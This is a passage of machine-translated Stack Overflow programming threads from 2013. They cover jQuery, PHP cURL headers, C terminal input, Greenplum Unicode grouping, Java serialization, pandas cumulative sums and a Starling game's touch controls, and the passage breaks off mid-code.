[HttpTransportSE.java](https://github.com/mosabua/ksoap2-android/blob/master/ksoap2-j2se/src/main/java/org/ksoap2/transport/HttpTransportSE.java)有多个构造函数。

```
/**
* Creates instance of HttpTransportSE with set url
*
* @param url
* the destination to POST SOAP data
* @param timeout
* timeout for connection and Read Timeouts (milliseconds)
*/
    public HttpTransportSE(String url, int timeout) {
        super(url, timeout);
    } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-05T06:04:50.273

这在 localhost 中调试时非常普遍，这会导致`SocketTimeoutException`. 尝试一个真正的在线服务器，你应该没问题

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-08T05:32:49.857

我解决了我的问题，问题终于发布了我的网络服务，为什么不连接并给我发送空指针。我完成了主题，谢谢

# javascript - Jquery textarea.val('') 在第一次输入时添加换行符？

> ID：15825945
> 
> 赞同：0
> 
> 时间：2013-04-05T04:32:13.353
> 
> 标签：javascript, jquery, html, css, textarea

我有一些聊天设置，如果文本区域处于焦点位置，则在输入时按下，我将其设置为将聊天提交到我的数据库并清除文本区域。不幸的是，第一次按下 Enter 时，它会在任何浏览器中的文本区域中添加换行符。如果您再次键入并按回车，那里仍然只有一个换行符。我错过了什么吗？

谢谢！

```
 $(document).keypress(function(keyPress) {
        if (keyPress.which == 13) {
            if ($('#chatText').is(':focus')) {
                if ($('#chatText').val().length > 0) {
                    chatValue = $('#chatText').val();
                    $('#chatText').val($('#chatText').val().substring(0,0));
                    $.ajax({
                        type: 'POST',
                        url: 'submitChat.php',
                        data: { chatText: chatValue },
                        success: function(result) {
                            $('#chat_text').html(result);
                            document.getElementById('chat_text').scrollTop = 9999999;
                        }
                    });
                }
            }
        }
    }); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-05T04:40:12.030

你为什么不直接清除它？

```
$('#chatText').keypress(function(e) {
    if (e.which == 13) {
        var value = $(this).val();

        if (value.length > 0) {
            $(this).val('');

            $.ajax({
                type: 'POST',
                url: 'submitChat.php',
                data: {
                    chatText: value
                },
                success: function(result) {
                    $('#chat_text').html(result);
                    this.scrollTop = 9999999;
                }
            });
        }
    }
}); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-05T04:38:12.117

尝试这个，

```
$(document).keypress(function(keyPress) {
            if (keyPress.which == 13) {
                keyPress.preventDefault();
                if ($('#chatText').is(':focus')) {
                    if ($('#chatText').val().length > 0) {
                        chatValue = $('#chatText').val();
                        $('#chatText').empty();
                        $.ajax({
                            type: 'POST',
                            url: 'submitChat.php',
                            data: { chatText: chatValue },
                            success: function(result) {
                                $('#chat_text').html(result);
                                document.getElementById('chat_text').scrollTop = 9999999;
                            }
                        });
                    }
                }
            }
        }); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-05T04:38:32.750

```
 $(document).keypress(function(keyPress) {

        if (keyPress.which == 13) {
            keyPress.preventDefault();// Add this line
            if ($('#chatText').is(':focus')) {
                if ($('#chatText').val().length > 0) {
                    chatValue = $('#chatText').val();
                    $('#chatText').val($('#chatText').val().substring(0,0));
                    $.ajax({
                        type: 'POST',
                        url: 'submitChat.php',
                        data: { chatText: chatValue },
                        success: function(result) {
                            $('#chat_text').html(result);
                            document.getElementById('chat_text').scrollTop = 9999999;
                        }
                    });
                }
            }
        }
    }); 
```

# php - 从浏览器获取 'html' 类型而不是 'image'

> ID：15825947
> 
> 赞同：0
> 
> 时间：2013-04-05T04:32:22.370
> 
> 标签：php, javascript, curl

我正在使用 CURL 从我们的服务器获取图像文件。检查浏览器的开发者工具后，它说返回的类型是 'html' 而不是 'image'。

这是回应：

```
/f/gc.php?f=http://www.norbert.com/get/image/BTS-005-00.jpg
GET 200 text/html   484.42 KB   1.68 s  <img> 
```

这是 CURL 脚本：

```
$ch = curl_init();
$strUrl = $strFile;
curl_setopt($ch, CURLOPT_URL, $strUrl);
curl_setopt($ch, CURLOPT_USERAGENT, "MozillaXYZ/1.0");
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_TIMEOUT, 60);
$output = curl_exec($ch);
curl_close($ch);
return $output; 
```

我可以在 CURL 脚本中添加任何其他特定代码吗？

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-05T04:36:01.440

您的 PHP 脚本正在执行 cURL 并返回没有特定图像标题的输出。

因此，默认情况下，浏览器会将数据检索为 HTML 内容。

在返回输出之前尝试添加更具体的标题。

尝试

```
header('Content-Type: image/jpg'); 
```

向浏览器指定脚本实际发送的内容类型。

如果您希望用户能够下载为文件，您还可以添加标题：

```
header('Content-Disposition: attachment; filename="' . $fileName . '";'); 
```

如果您要发送二进制内容，您可以添加：

```
header("Content-Transfer-Encoding: binary"); 
```

# c - 如何立即对 C 中的按键做出反应？

> ID：15825950
> 
> 赞同：2
> 
> 时间：2013-04-05T04:32:24.607
> 
> 标签：c, unix, terminal, keypress

当用户按下一个键时，我试图调用一个函数，有点像用 Ctrl-C 发送信号。这个想法是做某事，说在一个while循环中，并积极地听，说，被按下的'f'键。当它被按下时，程序将停止执行循环并执行其他操作，因为按下了“f”键。

有没有办法自定义信号映射？我没有太多运气。似乎还有 1 或 2 个可用于自定义的信号，但我需要 3 个。

如果我使用 getchar()，用户需要按“f”键，然后按回车键。我希望他们只需按“f”键而不必按回车键。

这与使用 unix 程序非常相似，`more`用户只需按空格键即可浏览页面。

任何帮助是极大的赞赏！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-05T04:51:51.780

如果由于某种原因您不喜欢 ncurses，您可以尝试以下方法。

您可以使用一个单独的线程，该线程使用`select()`on`stdin`然后执行`read()`on`stdin`并解析用户输入；如果关键是您要查找的内容，请向您的主线程发送一个信号（即`USER1`或未`USER2`使用）。在您的信号处理程序中，执行您希望对中断执行的任何操作。请注意，这样做意味着您的代码必须是可中断的，因此中断不会中断您的计算。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-04-05T05:45:27.850

到目前为止，最简单的选择是使用`ncurses`.

但是，如果这不可接受，POSIX（因此也包括 Linux）定义了一系列用于“终端控制”的例程——名称以以下开头`tc`并包括：

*   [`tcdrain()`](http://pubs.opengroup.org/onlinepubs/9699919799/functions/tcdrain.html)
*   [`tcflow()`](http://pubs.opengroup.org/onlinepubs/9699919799/functions/tcflow.html)
*   [`tcflush()`](http://pubs.opengroup.org/onlinepubs/9699919799/functions/tcflush.html)
*   [`tcgetattr()`](http://pubs.opengroup.org/onlinepubs/9699919799/functions/tcgetattr.html)
*   [`tcgetpgrp()`](http://pubs.opengroup.org/onlinepubs/9699919799/functions/tcgetpgrp.html)
*   [`tcgetsid()`](http://pubs.opengroup.org/onlinepubs/9699919799/functions/tcgetsid.html)
*   [`tcsendbreak()`](http://pubs.opengroup.org/onlinepubs/9699919799/functions/tcsendbreak.html)
*   [`tcsetattr()`](http://pubs.opengroup.org/onlinepubs/9699919799/functions/tcsetattr.html)
*   [`tcsetpgrp()`](http://pubs.opengroup.org/onlinepubs/9699919799/functions/tcsetpgrp.html)

在这种情况下，您主要需要`tcgetattr()`和`tcsetattr()`。您将需要研究 和 定义中的限制`tcgetattr()`，`tcsetattr()`并且需要研究[`<termios.h>`](http://pubs.opengroup.org/onlinepubs/9699919799/basedefs/termios.h.html)标题中的结构和标志。例如，查看`ICANON`本地模式：您可能希望将其关闭，以便在输入字符后立即读取字符。

# unicode - PostgreSQL 对 Unicode 字符串按错误分组？

> ID：15825952
> 
> 赞同：2
> 
> 时间：2013-04-05T04:32:38.913
> 
> 标签：unicode, group-by, greenplum

我发生了一件非常奇怪的事情，我注意到如果 a`group by (word)`是 UTF-8 字符串，它并不总是按单词分组。在同一个查询中，我得到了正确分组的情况，以及没有正确分组的情况。我想知道是否有人知道这是怎么回事？

```
select *,count(*) over (partition by md5(word)) as k
from (
  select word,count(*) as n
  from :tmpwl
  group by 1
) a order by 1,2 limit 12;
/* gives:
 word | n | k 
------+---+---
 いい | 1 | 1
 くず | 1 | 1
 ごみ | 1 | 1
 さま | 1 | 1
 さん | 1 | 1
 へま | 1 | 1
 まめ | 1 | 1
 よく | 1 | 1
 ろく | 1 | 1
 ネガ | 1 | 2   -- what the heck?
 ネガ | 1 | 2
 パス | 1 | 1
*/ 
```

请注意，以下解决方法可以正常工作：

```
select word,n,count(*) over (partition by md5(word)) as k
from (
  select md5(word),max(word) as word,count(*) as n
  from :tmpwl
  group by 1
) a order by 1,2 limit 12;
/* gives:
 word | n | k 
------+---+---
 いい | 1 | 1
 くず | 1 | 1
 ごみ | 1 | 1
 さま | 1 | 1
 さん | 1 | 1
 へま | 1 | 1
 まめ | 1 | 1
 よく | 1 | 1
 ろく | 1 | 1
 ネガ | 2 | 1
 パス | 1 | 1
 プア | 1 | 1
*/ 
```

版本为x86_64-unknown-linux-gnu上的PostgreSQL 8.2.14（Greenplum Database 4.0.4.0 build 3 Single-Node Edition），由GCC gcc.exe（GCC）4.1.1编译，编译于2010年11月30日17:20： 26.

源表`:tmpwl`：

```
\d :tmpwl
Table "pg_temp_25149.pdtmp_foo706453357357532"
  Column  |  Type   | Modifiers 
----------+---------+-----------
 baseword | text    | 
 word     | text    | 
 value    | integer | 
 lexicon  | text    | 
 nalts    | bigint  | 
Distributed by: (word) 
```

# java - 如何将状态保存到文件并确保文件安全？

> ID：15825955
> 
> 赞同：0
> 
> 时间：2013-04-05T04:32:53.363
> 
> 标签：java

我正在尝试为我的游戏创建保存状态，与其说是游戏所在的位置，不如说是一些简单的东西，比如记分板。格式将是这样的：

```
Wins: 5
Losses: 10
GamesPlayed: 15 
```

我需要能够访问该文件，并且根据玩家是否赢/输，它将+1附加到文件中的值。

解决此问题的最佳方法是什么？我听说过许多保存数据的不同方法，例如 XML，但这些方法对我的数据大小来说不是矫枉过正吗？

此外，我确实希望让`safe`用户无法进入文件并更改数据。我需要做某种加密吗？而且，如果用户删除文件并用一个空文件替换它，他们不能在技术上重置他们的值吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-05T04:42:59.423

您可以为此使用普通的序列化/反序列化。为了序列化/反序列化一个类，它必须实现`Serializable`接口。这是一个开始的例子：

```
public class Score implements Serializable {
    private int wins;
    private int loses;
    private int gamesPlayed;
    //constructor, getter and setters...
}

public class ScoreDataHandler {

    private static final String fileName = "score.dat";
    public void saveScore(Score score) {
        ObjectOutputStreamout = null;
        try {
            out = new ObjectOutputStream(new FileOutputStream(fileName));
            out.writeObject(score);
        } catch (Exception e) {
            //handle your exceptions...
        } finally {
            if (out != null) {
                try {
                    out.close();
                } catch (IOException ioe) {
                }
            }
        }
    }

    public Score loadScore() {
        ObjectInputStreamin = null;
        Score score = null;
        try {
            in = new ObjectInputStream(new FileInputStream(fileName));
            score = (Score)in.readObject();
        } catch (Exception e) {
            //handle your exceptions...
        } finally {
            if (in != null) {
                try {
                    in.close();
                } catch (IOException ioe) {
                }
            }
        }
        return score;
    }
} 
```

# drupal - Drupal 7 管理员新菜单

> ID：15825967
> 
> 赞同：1
> 
> 时间：2013-04-05T04:33:48.000
> 
> 标签：drupal, drupal-7, drupal-theming

是否可以在 Drupal 7 中实现新的管理菜单？

目前我正在使用七个主题。

我想要做的是在内容菜单上添加另一个选项卡，其中只有：评论、对内容的评论、评论、提交。

我在管理菜单结构上添加了一个新菜单，但该菜单没有显示在任何地方。

我做了page--admin--content--submission.tpl.php 开始制作界面，但是按照当前选择的admin主题无法制作。

请指出我某个地方，因为我已经没有运气了。

更新截图：

![测试](https://i.stack.imgur.com/zsDEQ.jpg)

![测试2](https://i.stack.imgur.com/4moG4.jpg)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-05-26T04:46:05.110

您是否尝试清除缓存？您可以通过 yoursite.com/admin/config/development/performance 上的“性能”页面执行此操作。

# cocos2d-iphone - 花栗鼠物理定位

> ID：15825970
> 
> 赞同：0
> 
> 时间：2013-04-05T04:34:28.467
> 
> 标签：cocos2d-iphone, chipmunk, physics-engine

我环顾四周，无法找到这个问题的简明答案。对于我的 Cocos2D 游戏，我集成了 Chipmunk 物理引擎。在初始化时，我通过建立一系列身体和静态形状来设置“运动场”的边界，如下所示：

```
- (void)initPlayingField {
    // Physics parameters
    CGSize fieldSize = _model.fieldSize;
    CGFloat radius = 2.0;
    CGFloat elasticity = 0.3;
    CGFloat friction = 1.0;

    // Bottom
    CGPoint lowerLeft = ccp(0, 0);
    CGPoint lowerRight = ccp(fieldSize.width, 0);
    [self addStaticBodyToSpace:lowerLeft finish:lowerRight radius:radius elasticity:elasticity friction:friction];

    // Left
    CGPoint topLeft = ccp(0, fieldSize.height);
    [self addStaticBodyToSpace:lowerLeft finish:topLeft radius:radius elasticity:elasticity friction:friction];

    // Right
    CGPoint topRight = ccp(fieldSize.width, fieldSize.height);
    [self addStaticBodyToSpace:lowerRight finish:topRight radius:radius elasticity:elasticity friction:friction];

    // Top
    [self addStaticBodyToSpace:topLeft finish:topRight radius:radius elasticity:elasticity friction:friction];
} 
```

此设置有效，除了一件事 - 边界的位置似乎偏离了右侧的大量像素。在初始化玩家并将他发送到边界墙后，它不会从屏幕边缘反弹（正如我所期望的那样，将边界框设置为 0,0），而是一些像素数（可能是 30- 50) 从屏幕边缘向内。是什么赋予了？

我最初认为问题出在我渲染玩家精灵的地方，但在通过调试器运行它之后，一切看起来都很好。使用花栗鼠的位置来渲染精灵时，是否需要遵循特殊的协议？我是否需要将所有内容都乘以某种 PIXELS_PER_METER？如果它们在精灵表中会有关系吗？精灵批处理节点？这是我在视图中设置精灵位置的方法：

```
Player *player = [[RootModel sharedModel] player];
self.playerSprite.position = player.position;
self.playerSprite.rotation = player.rotation; 
```

这是我在模型中设置位置的方式：

```
- (void)update:(CGFloat)dt {
    self.position = self.body->p;
    self.rotation = self.body->a;
} 
```

（是的，我知道存储位置是多余的，因为花栗鼠天生就是这样做的。）

此外，对于那些完成阅读帖子的人来说，奖金问题。你怎么能以恒定的速度在它所面对的任何方向上移动一个物体，只允许它在任何给定时间向左或向右转，但从不减速？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-05T08:09:39.810

物理体的形状是什么？也许您只是忘记考虑使形状与精灵的大小相同。如果只考虑位置，那么精灵将能够在任何边框处移动到屏幕外的一半，因为它的位置在精灵的中心。

要以恒定速度移动物体，请在禁用摩擦（设置为 0？）的同时设置它的速度，并允许它以其冲击速度从碰撞中反弹（在 Box2D 中，restitution = 1，不知道 Chipmunk）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-05T13:49:21.173

您是否尝试过调试绘制碰撞形状？Cocos2D 2.1 中包含我的 CCPhysicsDebugNode 类，使其非常容易添加。这会让您知道您的几何图形是否与您的图形对齐。你的边界形状有多厚？您是否可能将精灵添加到可能抵消它们的父节点？

Chipmunk 不需要您针对任何真实单位对其进行调整。您可以只使用像素或其他任何东西。

最后，@LearnCocos2D 对恒定速度有正确的想法。将摩擦力设置为 0，将弹性设置为 1.0。您可能还想检查它每帧的速度并将其加速回到每帧的正常速度。与非静态几何体碰撞会导致它失去速度。

# javascript - 如何知道可以从浏览器/js 访问机器

> ID：15825974
> 
> 赞同：0
> 
> 时间：2013-04-05T04:35:15.673
> 
> 标签：javascript, web-applications, browser, cross-browser

除了知道浏览器/js 的限制之外，问这样的问题可能看起来很奇怪。但我仍然想知道是否有人有任何提示。

我有一个 Web 应用程序正在运行，在一个页面上我接受用户的 IP 地址，用户设备的 IP 地址，理想情况下是网络资源。假设可以从用户的桌面访问此 ip。

接受该 IP 地址后，我仍然想使用一些 js 从浏览器检查它是否真的可以访问。

任何想法。

注意：我已经对其进行正则表达式以检查它是否似乎是 Intranet 资源。

# python - 如何在熊猫索引中累积唯一的列总和

> ID：15825981
> 
> 赞同：4
> 
> 时间：2013-04-05T04:36:09.723
> 
> 标签：python, numpy, pandas

我有一个 pandas DateFrame, df 我用它创建的

```
df = pd.read_table('sorted_df_changes.txt', index_col=0, parse_dates=True, names=['date', 'rev_id', 'score']) 
```

它的结构如下：

```
 page_id     score  
date
2001-05-23 19:50:14  2430        7.632989
2001-05-25 11:53:55  1814033     18.946234
2001-05-27 17:36:37  2115        3.398154
2001-08-04 21:00:51  311         19.386016
2001-08-04 21:07:42  314         14.886722 
```

date 是索引并且是 DatetimeIndex 类型。

每个 page_id 可能出现在一个或多个日期中（不是唯一的），并且大小约为 100 万。所有页面共同构成了**文档**。

我需要在日期的每个时间获得整个**文档**的分数，同时只计算任何给定 page_id 的最新分数。

## 例子

### 示例数据

```
 page_id     score  
date
2001-05-23 19:50:14  1           3
2001-05-25 11:53:55  2           4
2001-05-27 17:36:37  1           5
2001-05-28 19:36:37  1           1 
```

### 示例解决方案

```
 score  
date
2001-05-23 19:50:14  3
2001-05-25 11:53:55  7 (3 + 4)
2001-05-27 17:36:37  9 (5 + 4)
2001-05-28 19:36:37  5 (1 + 4) 
```

2 的条目被连续计数，因为它没有重复，但每次重复 id 1 时，新分数都会替换旧分数。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-05T08:44:31.933

**编辑**：

最后，我找到了一个不需要for循环的解决方案：

```
df.score.groupby(df.page_id).transform(lambda s:s.diff().combine_first(s)).cumsum() 
```

我认为需要一个 for 循环：

```
from StringIO import StringIO
txt = """date,page_id,score
2001-05-23 19:50:14,  1,3
2001-05-25 11:53:55,  2,4
2001-05-27 17:36:37,  1,5
2001-05-28 19:36:37,  1,1
2001-05-28 19:36:38,  3,6
2001-05-28 19:36:39,  3,9
"""

df = pd.read_csv(StringIO(txt), index_col=0)

def score_sum_py(page_id, scores):
    from itertools import izip
    score_sum = 0
    last_score = [0]*(np.max(page_id)+1)
    result = np.empty_like(scores)
    for i, (pid, score) in enumerate(izip(page_id, scores)):
        score_sum = score_sum - last_score[pid] + score
        last_score[pid] = score
        result[i] = score_sum
    result.name = "score_sum"
    return result

print score_sum_py(pd.factorize(df.page_id)[0], df.score) 
```

输出：

```
date
2001-05-23 19:50:14     3
2001-05-25 11:53:55     7
2001-05-27 17:36:37     9
2001-05-28 19:36:37     5
2001-05-28 19:36:38    11
2001-05-28 19:36:39    14
Name: score_sum 
```

如果python中的循环很慢，你可以尝试将两个系列的page_id，scores先转换为python列表，循环列表并使用python的本机整数计算可能更快。

如果速度很重要，你也可以试试 cython：

```
%%cython
cimport cython
cimport numpy as np
import numpy as np

@cython.wraparound(False) 
@cython.boundscheck(False)
def score_sum(np.ndarray[int] page_id, np.ndarray[long long] scores):
    cdef int i
    cdef long long score_sum, pid, score
    cdef np.ndarray[long long] last_score, result

    score_sum = 0
    last_score = np.zeros(np.max(page_id)+1, dtype=np.int64)
    result = np.empty_like(scores)

    for i in range(len(page_id)):
        pid = page_id[i]
        score = scores[i]
        score_sum = score_sum - last_score[pid] + score
        last_score[pid] = score
        result[i] = score_sum

    result.name = "score_sum"
    return result 
```

在这里，我使用`pandas.factorize()`将 转换为`page_id`范围为 0 和 N 的数组。其中 N 是 中元素的唯一计数`page_id`。您还可以使用 dict 来缓存每个 page_id 的 last_score 而无需使用`pandas.factorize()`.

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-05T12:06:26.787

另一种数据结构使这个计算更容易推理，性能不会像其他答案那么好，但我认为值得一提*（主要是因为它使用了我最喜欢的 pandas 函数......）*：

```
In [11]: scores = pd.get_dummies(df['page_id']).mul(df['score'], axis=0).where(x!=0, np.nan)

In [12]: scores
Out[12]: 
                      1   2   3
date                           
2001-05-23 19:50:14   3 NaN NaN
2001-05-25 11:53:55 NaN   4 NaN
2001-05-27 17:36:37   5 NaN NaN
2001-05-28 19:36:37   1 NaN NaN
2001-05-28 19:36:38 NaN NaN   6
2001-05-28 19:36:39 NaN NaN   9

In [13]: scores.ffill()
Out[13]: 
                     1   2   3
date                          
2001-05-23 19:50:14  3 NaN NaN
2001-05-25 11:53:55  3   4 NaN
2001-05-27 17:36:37  5   4 NaN
2001-05-28 19:36:37  1   4 NaN
2001-05-28 19:36:38  1   4   6
2001-05-28 19:36:39  1   4   9

In [14]: scores.ffill().sum(axis=1)
Out[14]: 
date
2001-05-23 19:50:14     3
2001-05-25 11:53:55     7
2001-05-27 17:36:37     9
2001-05-28 19:36:37     5
2001-05-28 19:36:38    11
2001-05-28 19:36:39    14 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-05T06:45:49.150

这是你想要的吗？但我认为这是一个愚蠢的解决方案。

```
In [164]: df['result'] = [df[:i+1].groupby('page_id').last().sum()[0] for i in range(len(df))]

In [165]: df
Out[165]: 
                     page_id  score  result
date                                       
2001-05-23 19:50:14        1      3       3
2001-05-25 11:53:55        2      4       7
2001-05-27 17:36:37        1      5       9
2001-05-28 19:36:37        1      1       5 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-05T08:45:58.140

这是我使用标准库放在一起的临时解决方案。我希望看到一个使用 pandas 的优雅高效的解决方案。

```
import csv
from collections import defaultdict

page_scores = defaultdict(lambda: 0)
date_scores = [] # [(date, score)]

def get_and_update_score_diff(page_id, new_score):
    diff = new_score - page_scores[page_id]
    page_scores[page_id] = new_score
    return diff

# Note: there are some duplicate dates and the file is sorted by date.
# Format: 2001-05-23T19:50:14Z, 2430, 7.632989
with open('sorted_df_changes.txt') as f:
    reader = csv.reader(f, delimiter='\t')

    first = reader.next()
    date_string, page_id, score = first[0], first[1], float(first[2])
    page_scores[page_id] = score
    date_scores.append((date_string, score))

    for date_string, page_id, score in reader:
        score = float(score)
        score_diff = get_and_update_score_diff(page_id, score)
        if date_scores[-1][0] == date_string:
            date_scores[-1] = (date_string, date_scores[-1][1] + score_diff)
        else:
            date_scores.append((date_string, date_scores[-1][1] + score_diff)) 
```

# button - 我应该如何在 Starling 中设置我的触控？

> ID：15825984
> 
> 赞同：0
> 
> 时间：2013-04-05T04:36:16.817
> 
> 标签：button, touch, controls, flash-builder, multi-touch

我正在开发一个有两个控件的八哥游戏。一种是用户的左手拇指触摸屏幕左侧的任意位置，这会在 y 轴上上下拖动角色。我在实现时遇到问题的另一个控件是屏幕右下角的一个按钮，它可以让角色发射子弹。

我的问题是如何设置它而不让角色在按下按钮时跳到屏幕底部。

我需要弄乱多点触控才能让它运行吗？

我有一个更具体的问题是如何为八哥中的精灵定义一个矩形？由于starling 没有绘图API，我不能这样做......

```
 touchLayer.graphics.beginFill(0x000000, 0);
        touchLayer.graphics.drawRect(0, 0, stage.stageWidth, stage.stageHeight);
        touchLayer.graphics.endFill(); 
```

目前我的角色拖动正在工作，但触摸在屏幕上无处不在（我不知道如何让它只是屏幕的左侧......）

任何建议将不胜感激，谢谢。

这是我要求的 InGame 类的完整代码。

```
package screens
{
    import flash.geom.Point;
    import flash.geom.Rectangle;
    import flash.utils.getTimer;

    import objects.Enemy;
    import objects.GameBackground;
    import objects.Laser;
    import objects.Scarlet;
    import objects.SnowBall;

    import starling.display.Button;
    import starling.display.Sprite;
    import starling.events.Event;
    import starling.events.Touch;
    import starling.events.TouchEvent;
    import starling.utils.RectangleUtil;
    import starling.utils.deg2rad;

    public class InGame extends Sprite
    {
        private var startBtn:Button;
        private var fireBtn:Button;
        private var bg:GameBackground;
        private var scarlet:Scarlet;

        private var enemies:Array;
        private var lasers:Array;
        private var scarletLocation:Point;

        private var lasersLayer:Sprite;
        private var enemiesLayer:Sprite;
        private var touchLayer:Sprite;

        private var enemySpawnDelay:Number;
        private var enemySpawnCounter:Number;

        private var difficulty:Number;
        private var difficultyRate:Number;

        private var timePrevious:Number;
        private var timeCurrent:Number;
        private var elapsed:Number;

        private var gameState:String;
        private var playerSpeed:Number;
        private const MIN_SPEED:Number = 650;

        //private var scoreDistance:int;

        private var gameArea:Rectangle;
        private var touchArea:Rectangle;
        private var shape:starling.display.Sprite = new starling.display.Sprite();

        private var target:Point = new Point(100, 100);

        private var touch:Touch;
        private var touchX:Number;
        private var touchY:Number;

        public function InGame()
        {
            super();
            this.addEventListener(starling.events.Event.ADDED_TO_STAGE, onAddedToStage);
        }

        private function onAddedToStage(event:Event):void
        {
            this.removeEventListener(Event.ADDED_TO_STAGE, onAddedToStage);
            drawGame();
        }

        private function drawGame():void
        {
            bg = new GameBackground();
            this.addChild(bg);

            scarlet = new Scarlet;
            scarlet.x = stage.stageWidth/2;
            scarlet.y = stage.stageHeight/2;
            this.addChild(scarlet);

            startBtn = new Button(Assets.getTexture("PlayBtn"));
            startBtn.x = stage.stageWidth * 0.5 - startBtn.width * 0.5;
            startBtn.y = stage.stageHeight * 0.5 - startBtn.height * 0.5 + 35;
            this.addChild(startBtn);

            fireBtn = new Button(Assets.getTexture("FireBtn"));
            fireBtn.x = 675;
            fireBtn.y = 435;
            this.addChild(fireBtn);

            //defines area scarlet can fly in
            gameArea = new Rectangle(0, 15, stage.stageWidth, stage.stageHeight - 150);
        }

        public function disposeTemporarily():void
        {
            this.visible = false;
        }

        public function initialize():void
        {
            this.visible = true;

            this.addEventListener(Event.ENTER_FRAME, checkElapsed);

            scarlet.x = -stage.stageWidth;
            scarlet.y = stage.stageHeight * 0.5;

            gameState = "idle";

            playerSpeed = 0;

            difficultyRate = 0.3;
            difficulty = 1;
            enemySpawnDelay = enemySpawnCounter = 100;

            enemies = new Array();
            lasers = new Array();

            scarletLocation = new Point(200, 400);

            addEventListener(Event.ENTER_FRAME, update);

            lasersLayer = new Sprite();
            enemiesLayer = new Sprite();
            touchLayer = new Sprite();

            addChild(lasersLayer);
            addChild(enemiesLayer);
            addChild(touchLayer);

            addEventListener(Event.ADDED_TO_STAGE, setupTouchLayer);
            touchLayer.addEventListener(Event.TRIGGERED, shootLaser);

            //scoreDistance = 0;

            startBtn.addEventListener(Event.TRIGGERED, onStartBtnClick);

            this.addEventListener(TouchEvent.TOUCH, onTouch);
        }

        private function onStartBtnClick(event:Event):void
        {
            startBtn.visible = false;
            startBtn.removeEventListener(Event.TRIGGERED, onStartBtnClick);

            launchScarlet();
        }

        private function launchScarlet():void
        {
            this.addEventListener(TouchEvent.TOUCH, onTouch);
            this.addEventListener(Event.ENTER_FRAME, onGameTick);
        }

        private function onTouch(event:TouchEvent):void
        {
            touch = event.getTouch(stage);

            touchX = touch.globalX;
            touchY = touch.globalY;

            target.x = event.touches[0].globalX;
            target.y = event.touches[0].globalY;
        }

        private function onGameTick(event:Event):void
        {
            switch(gameState)
            {
                case"idle":
                    //Take off
                    if (scarlet.x < stage.stageWidth * 0.5 * 0.5)
                    {
                        scarlet.x += ((stage.stageWidth * 0.5 * 0.5 + 10) - scarlet.x) * 0.5;
                        scarlet.y = stage.stageHeight * 0.5;

                        playerSpeed += (MIN_SPEED - playerSpeed) * 0.05;
                    }
                    else
                    {
                        gameState = "flying";
                    }
                    break;
                case"flying":
                    playerSpeed -= (playerSpeed - MIN_SPEED) * 0.01;

                    scarlet.y -= (scarlet.y - touchY) * 0.1;

                    if (-(scarlet.y - touchY) < 150 && -(scarlet.y - touchY) > -150)
                    {
                        scarlet.rotation = deg2rad(-(scarlet.y - touchY) * 0.075);
                    }

                    if (scarlet.y > gameArea.bottom - scarlet.height * 0.5)
                    {
                        scarlet.y = gameArea.bottom - scarlet.height * 0.5;
                        scarlet.rotation = deg2rad(0);
                    }
                    if (scarlet.y < gameArea.top + scarlet.height * 0.5)
                    {
                        scarlet.y = gameArea.top + scarlet.height * 0.5;
                        scarlet.rotation = deg2rad(0);
                    }

                    //scoreDistance += (playerSpeed * elapsed) * 0.1;
                    //trace(scoreDistance);

                    break;
                case"over":
                    break;
            }
        }

        //addapted from "Shoot"
        private function setupTouchLayer(event:Event):void
        {
            touchLayer.graphics.beginFill(0x000000, 0);
            touchLayer.graphics.drawRect(0, 0, stage.stageWidth, stage.stageHeight);
            touchLayer.graphics.endFill();

            touchArea = new Rectangle(0, 0, stage.stageWidth, stage.stageHeight);
        }

        private function shootLaser(event:TouchEvent):void
        {
            makeLaser(scarletLocation);
        }

        private function makeLaser(scarletLocation:Point):void
        {
            var newLaser:Laser = new Laser();

            newLaser.x = scarletLocation.x;
            newLaser.y = scarletLocation.y;

            newLaser.xVel = 5;
            newLaser.yVel = 5;

            newLaser.addEventListener(Laser.PURGE_EVENT, purgeLaserHandler);

            lasersLayer.addChild(newLaser);
            lasers.push(newLaser);
        }

        private function purgeLaserHandler(event:Event):void
        {
            var targetLaser:Laser = Laser(event.target);
            purgeLaser(targetLaser);
        }

        private function purgeLaser(targetLaser:Laser):void
        {
            targetLaser.removeEventListener(Laser.PURGE_EVENT, purgeLaserHandler);
            try
            {
                var i:int;
                for (i = 0; i < lasers.length; i++)
                {
                    if (lasers[i].name == targetLaser.name)
                    {
                        lasers.splice(i, 1);
                        lasersLayer.removeChild(targetLaser);
                        i = lasers.length;
                    }
                }
            }
            catch(e:Error)
            {
                trace("Failed to delete laser!", e);
            }
        }

        private function makeEnemies():void
        {
            enemySpawnCounter++;

            if (enemySpawnCounter > enemySpawnDelay)
            {
                enemySpawnCounter = 0;
                enemySpawnDelay -= difficultyRate;
                difficulty += difficultyRate;
                makeEnemy();
            }
        }

        private function makeEnemy():void
        {

            var i:int;
            for (i = 0; i < Math.floor(difficulty); i++)
            {
                var newEnemy:Enemy = new SnowBall();

                newEnemy.x = 925;
                newEnemy.y = Math.random() * 375 + 50;
                //trace(newEnemy.x); trace(newEnemy.y);
                newEnemy.xVel = (-Math.random() * difficulty) - 5;
                newEnemy.sinMeter = Math.random() * 10;
                newEnemy.bobValue = Math.random() * difficulty;

                newEnemy.addEventListener(Enemy.PURGE_EVENT, purgeEnemyHandler);

                enemiesLayer.addChild(newEnemy);
                enemies.push(newEnemy);
            }
        }

        private function purgeEnemyHandler(event:Event):void
        {
            var targetEnemy:Enemy = Enemy(event.target);
